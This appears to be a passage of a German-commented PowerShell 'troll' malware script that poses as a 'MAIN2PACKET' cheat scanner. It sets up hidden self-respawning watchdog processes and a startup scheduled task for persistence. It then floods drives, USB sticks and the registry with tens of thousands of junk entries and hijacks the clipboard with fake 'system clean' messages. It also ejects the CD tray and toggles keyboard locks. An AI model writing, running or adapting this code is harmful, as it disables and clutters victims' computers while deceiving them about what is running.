# ===== TRIPLE WATCHDOG - 4 FACH GESICHERT =====

# Watchdog 1 - Schnell (prüft alle 2 Sekunden)
$watchdog1 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
    if (`$p.Count -eq 0) { 
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
    }
    Start-Sleep -Seconds 2
}
"@
$watchdog1 | Out-File "$env:TEMP\wd_schnell.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_schnell.ps1`""

# Watchdog 2 - Mittel (prüft alle 10 Sekunden)
$watchdog2 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
    if (`$p.Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Seconds 10
}
"@
$watchdog2 | Out-File "$env:TEMP\wd_mittel.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_mittel.ps1`""

# Watchdog 3 - Langsam (prüft alle 30 Sekunden)
$watchdog3 = @"
while(`$true) {
    `$p = Get-Process powershell -ErrorAction SilentlyContinue
    `$troll = `$p | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
    if (`$troll.Count -eq 0) {
        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
    }
    Start-Sleep -Seconds 30
}
"@
$watchdog3 | Out-File "$env:TEMP\wd_langsam.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_langsam.ps1`""

# Watchdog 4 - Startup (überlebt PC-Neustart)
$watchdog4 = @"
`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
`$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "Main2packetWatchdog" -Action `$action -Trigger `$trigger -Force
"@
$watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_startup.ps1`""

# ===== EXTRA: USB-AUTO-SPAM =====
$usbJob = Start-Job -ScriptBlock {
    while ($true) {
        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
        foreach ($drive in $drives) {
            $drivePath = $drive.Root
            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
            try {
                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
                for ($u = 1; $u -le 100; $u++) {
                    $usbFile = Join-Path $mainUSB "usb_$u.king"
                    "MAIN2PACKET KING - USB" | Out-File $usbFile -Encoding UTF8 -Force
                }
            } catch {}
        }
        Start-Sleep -Seconds 30
    }
}

# ===== REGISTRY-SPAM =====
$regJob = Start-Job -ScriptBlock {
    for ($r = 1; $r -le 50000; $r++) {
        try {
            $regPath = "HKCU:\Software\MAIN2PACKET\Entry_$r"
            New-Item -Path $regPath -Force | Out-Null
            New-ItemProperty -Path $regPath -Name "Scanner" -Value "v9.4.2" -Force | Out-Null
        } catch {}
    }
}

# ===== CLIPBOARD-SPAM =====
$clipJob = Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    $texts = @(
        "MAIN2PACKET SCANNER AKTIV",
        "Scanning... 47%",
        "No cheats found",
        "System clean",
        "MAIN2PACKET v9.4.2"
    )
    while ($true) {
        Start-Sleep -Seconds 10
        $randomText = Get-Random $texts
        [System.Windows.Forms.Clipboard]::SetText($randomText)
    }
}

# ===== SOUND-SPAM =====
$soundJob = Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Media
    while ($true) {
        Start-Sleep -Seconds (Get-Random -Minimum 120 -Maximum 300)
        [System.Media.SystemSounds]::Hand.Play()
    }
}

# ===== CD-LAUFWERK RANDOM =====
$cdJob = Start-Job -ScriptBlock {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class CDROM {
        [DllImport("winmm.dll")]
        public static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
        public static void Eject() { mciSendString("set CDAudio door open", "", 127, IntPtr.Zero); }
        public static void Close() { mciSendString("set CDAudio door closed", "", 127, IntPtr.Zero); }
    }
'@
    while ($true) {
        Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
        [CDROM]::Eject()
        Start-Sleep -Seconds 2
        [CDROM]::Close()
    }
}

# ===== TASTATUR-SPOOF =====
$keyJob = Start-Job -ScriptBlock {
    $wsh = New-Object -ComObject WScript.Shell
    while ($true) {
        Start-Sleep -Seconds (Get-Random -Minimum 120 -Maximum 240)
        $wsh.SendKeys('{CAPSLOCK}')
        Start-Sleep -Milliseconds 100
        $wsh.SendKeys('{NUMLOCK}')
    }
}

# ===== HAUPTSCHLEIFE - 100 RUNDEN MIT MAXIMALEN DATEIEN =====
while ($global:currentRound -lt $global:maxRounds) {
    $global:currentRound++
    
    # ALLE ZIELE MIT DATEIEN FLUTEN
    foreach ($ziel in $alleZiele) {
        if (Test-Path $ziel) {
            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
            
            # 500 DATEIEN PRO ORDNER
            for ($i = 1; $i -le 500; $i++) {
                # Direkte Dateien
                "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
                
                # Dateien im Hauptordner
                "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
                
                # 100 RANDOM DATEIEN EXTRA
                if ($i % 50 -eq 0) {
                    $rand = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
                    "$env:COMPUTERNAME - $rand" | Out-File (Join-Path $ziel "MAIN2PACKET_$rand.king") -Encoding UTF8 -Force
                }
            }
            
            # 50 UNTERORDNER PRO HAUPTORDNER
            for ($u = 1; $u -le 1000; $u++) {
                $subFolder = Join-Path $mainFolder "SUB_$u"
                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
                
                # 50 DATEIEN PRO UNTERORDNER
                for ($s = 1; $s -le 500; $s++) {
                    $subFile = Join-Path $subFolder "subfile_$s.king"
                    "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
                }
            }
        }
    }
    
    # KURZE PAUSE ZWISCHEN RUNDEN
    Start-Sleep -Seconds 2
}

# ===== ENDE - LÄUFT WEITER DURCH WATCHDOGS =====
while ($true) {
    Start-Sleep -Seconds 3600
}
